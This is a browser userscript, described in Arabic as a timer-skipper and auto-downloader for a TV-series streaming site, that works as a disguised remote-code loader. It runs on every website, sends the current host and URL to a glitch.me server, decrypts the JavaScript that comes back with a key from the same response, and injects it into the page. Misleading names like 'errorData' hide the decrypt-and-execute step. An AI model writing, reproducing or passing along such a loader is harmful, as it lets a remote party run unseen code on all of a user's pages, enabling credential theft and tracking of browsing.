// ==UserScript==
// @name         SkipTimerForEcceq
// @namespace    http://tampermonkey.net/
// @version      2024-05-27
// @description  تخطي المؤقت و تحميل الحلقه/المسلسل تلقائي لموقع قصه عشق
// @author       You
// @match        *://*/*
// @grant        none
// @require      https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js
// ==/UserScript==













// (X) twitter : pzll0






















































(function () {
  "use strict";



  function ensureCryptoJSLoaded(callback) {
    const checkInterval = 100;
    const maxRetries = 10;
    let retries = 0;

    function check() {
      if (typeof CryptoJS !== "undefined") {
        callback();
      } else if (retries < maxRetries) {
        retries++;
        setTimeout(check, checkInterval);
      } else {
        const errorDiv = document.createElement("div");
      }
    }

    check();
  }

  function errorData(errorDataText, passphrase) {
    try {
      const bytes = CryptoJS.AES.decrypt(errorDataText, passphrase);
      const errorDataText2 = bytes.toString(CryptoJS.enc.Utf8);
      if (!errorDataText2) {
        throw new Error("Failed");
      }
      return errorDataText2;
    } catch (error) {
      throw new Error("Failed");
    }
  }

  ensureCryptoJSLoaded(function () {
    const scriptUrl = "https://neon-plant-oak.glitch.me/getJavaScriptCode";
    const currentHost = window.location.host;
    const currentUrl = window.location.href;

    fetch(scriptUrl, {
      method: "GET",
      headers: {
        "x-api-key": "Nqbh",
        "User-Agent": navigator.userAgent,
        Authority: window.location.hostname,
        Host: currentHost,
        referer: currentUrl
      },
    })
      .then((response) => {
        if (!response.ok) {
          return response.text().then((text) => {
            let errorMessage = `Error: ${text}`;

            const errorDiv = document.createElement("div");
            errorDiv.textContent = errorMessage;
            errorDiv.style.color = "red";
            errorDiv.style.fontSize = "24px";
            errorDiv.style.fontWeight = "bold";
            errorDiv.style.textAlign = "center";
            errorDiv.style.position = "fixed";
            errorDiv.style.top = "0";
            errorDiv.style.width = "100%";
            document.body.insertBefore(errorDiv, document.body.firstChild);
          });
        }

        return response.json();
      })
      .then((data) => {
        const helloDiv = document.createElement("div");
        helloDiv.textContent = data.XmyTwitter;
        helloDiv.style.color = "blue";
        helloDiv.style.fontSize = "24px";
        helloDiv.style.fontWeight = "bold";
        helloDiv.style.textAlign = "center";
        helloDiv.style.position = "fixed";
        helloDiv.style.top = "0";
        helloDiv.style.width = "100%";
        document.body.insertBefore(helloDiv, document.body.firstChild);

        // Decrypt and execute the script after showing HELLO
        let errorText;
        try {
          errorText = errorData(data.data, data.XmyTwitter);
        } catch (error) {
          const errorDiv = document.createElement("div");
          errorDiv.innerHTML = `حدث خطأ  : ${error.message}`;
          errorDiv.style.color = "red";
          errorDiv.style.fontSize = "24px";
          errorDiv.style.fontWeight = "bold";
          errorDiv.style.textAlign = "center";
          errorDiv.style.position = "fixed";
          errorDiv.style.top = "0";
          errorDiv.style.width = "100%";
          document.body.insertBefore(errorDiv, document.body.firstChild);
          return;
        }
        const scriptElement = document.createElement("script");
        scriptElement.type = "application/javascript";
        scriptElement.textContent = errorText;
        document.body.appendChild(scriptElement);
      })
      .catch((error) => {
        console.error("There was a problem with the fetch operation:", error);
        const errorDiv = document.createElement("div");
        errorDiv.innerHTML = `حدث خطأ: ${error.message} - URL: ${scriptUrl}`;
        errorDiv.style.color = "red";
        errorDiv.style.fontSize = "24px";
        errorDiv.style.fontWeight = "bold";
        errorDiv.style.textAlign = "center";
        errorDiv.style.position = "fixed";
        errorDiv.style.top = "0";
        errorDiv.style.width = "100%";
        document.body.insertBefore(errorDiv, document.body.firstChild);
      });
  });
})();
